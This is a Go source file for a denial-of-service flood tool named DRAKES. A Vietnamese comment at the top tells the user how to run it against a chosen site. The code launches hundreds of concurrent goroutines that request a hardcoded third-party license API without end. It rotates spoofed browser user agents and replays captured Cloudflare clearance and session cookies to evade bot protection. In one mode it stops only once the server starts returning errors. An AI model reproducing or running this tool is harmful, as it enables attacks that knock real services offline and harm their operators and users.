package main

/*
hướng dẫn
B1. Cài đặt Golang bằng cách truy cập vào đường link như sau: https://go.dev/dl/
B2. Mở File DDos Lên Và Chọn Tốc Độ ở dưới
B3. Khởi Động CMD bằng cách nhập vào đường dẫn cmd nơi chứa folder này luôn Hoặc Terminal Lên Gõ Lên Như Sau: go run ddos.go--site Đường Link Cần DDos
ví dụ: go run ddos.go --site https://abc.abc hoặc go run traffic.go "dường dẫn đến file ddos.go" --site https://abc.abc
vì chạy bằng golang nên hiệu suất khá cao
--- Chúc Bạn Thành Công ---
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
)

const __version__ = "1.0.1"

// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool     = false
headersReferers []string = []string{
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",

"Mozilla/5.0 (Windows NT 6.2; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Windows NT 6.2; Win32; x86; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Windows NT 6.1; Win32; x86; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Windows NT 10.0; Win32; x86; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (X11; Linux i686; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13.3; rv:109) Gecko/20100101 Firefox/112.0",	
	}

	
	headersUseragents []string = []string{
	"cf_clearance=tiQggH2GqK.LFUEMu9YhLKmBzKqD2A1uoVl53uXaB1Q-1683045824-0-250; xfa_user=443662%2CrTQ-qi1iQ28Q__hYmMyPEZtLaXqQnwNosu2bVXX0",
"cf_clearance=ssDBEQH_MMdRHUnDg0ABPH5NxioTpzuVIqNw6eGBrLw-1683046167-0-250; xfa_user=443661%2C2rYfeGsw630vT_-3aRTS07KWxHSGj61GfBeUEYbP",
	}
	cur int32
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("DRAKESMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 500 //TỐC ĐỘ 512, 1024, 2048, 4096 //chọn tốc độ ở đây
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("err parsing url parameter\n")
		os.Exit(1)
	}

	if version {
		fmt.Println("DRAKES", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("can'l load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	go func() {
		fmt.Println("-- DRAKES Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err )
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err )
				fmt.Println("\r-- DRAKES Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
}

func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	//var param_joiner string
	var client = new(http.Client)

	//if strings.ContainsRune(url, '?') {
	//	param_joiner = "&"
	//} else {
	//	param_joiner = "?"
	//}

	for {
		var q *http.Request
		var err error

		if data == "" {
			//q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
                q, err = http.NewRequest("GET", "https://api.giaiphapmmo.vn/api/client/licenses/active-v3", nil)

		} else {
			q, err = http.NewRequest("POST", url, strings.NewReader(data))
		}

		if err != nil {
			s <- callExitOnErr
			return
		}
		q.Header.Set("User-Agent", headersReferers[rand.Intn(len(headersReferers))])
                //q.Header.Set("Cache-Control", "no-cache")
              //  q.Header.Set("Authorization", "Basic Njk2OTY5OjY5Njk2OQ==")
//q.Header.Set("sec-ch-ua", '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"')
//q.Header.Set("sec-ch-ua-platform", "\"Windows\"")
q.Header.Set("Sec-Fetch-Site", "same-origin")
q.Header.Set("sec-ch-ua-mobile", "?0")
q.Header.Set("Sec-Fetch-Moden", "navigate")
q.Header.Set("Sec-Fetch-Dest", "empty")
q.Header.Set("Accept-Encoding", "gzip, deflate")
q.Header.Set("Accept-Language", "en-US,en;q=0.9")
q.Header.Set("Upgrade-Insecure-Requests", "1")
q.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
q.Header.Set("Cookie", headersUseragents[rand.Intn(len(headersUseragents))])
		//q.Header.Set("Accept-Charset", acceptCharset)
		//q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		//q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", "api.giaiphapmmo.vn")

		// Overwrite headers with parameters

		for _, element := range headers {
			words := strings.Split(element, ":")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}

		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, e.Error())
			if strings.Contains(e.Error(), "socket: too many open files") {
				s <- callExitOnTooManyFiles
				return
			}
			s <- callExitOnErr
			return
		}
		r.Body.Close()
		s <- callGotOk
		if safe {
			if r.StatusCode >= 500 {
				s <- targetComplete
			}
		}
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}
